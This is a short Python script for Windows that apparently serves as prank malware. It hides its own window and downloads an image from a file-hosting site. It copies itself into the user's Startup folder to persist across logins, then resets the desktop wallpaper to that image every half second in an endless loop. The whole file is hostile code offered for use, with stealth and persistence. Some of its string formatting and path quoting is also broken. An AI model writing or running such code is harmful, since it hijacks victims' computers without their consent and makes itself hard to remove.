from ctypes import *
from time import sleep
from getpass import getuser
import os
from winsound import Beep
import requests
import urllib
from win32con import SW_HIDE 
import win32gui 

def hidden():
    pid = win32gui.GetForegroundWindow() 
    win32gui.ShowWindow(pid , SW_HIDE) 

hidden() 



link="https://s18.picofile.com/file/8431340626/123.png"
urllib.request.urlretrieve(link,"delsy.png")

username = getuser() # Get The Current Username
os.mkdir('e:\\Delsy')
os.system('copy delsy.png e:\\Delsy'.format(username)) # Copy This jpg To Startup Directory


startup = 'C:\\Users\"{}"\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup'.format(username)   

os.system("copy {} {}".format(__file__ , startup)) # Copy This File To Startup Directory

Beep(1000,80)
Beep(1500,80)
Beep(2000,1000)


wall1 = 'e:\\Delsy\delsy.png'.encode()
print(wall1)


while True:
    windll.user32.SystemParametersInfoA(20 , 0 , c_char_p(wall1),0)
    sleep(0.5)



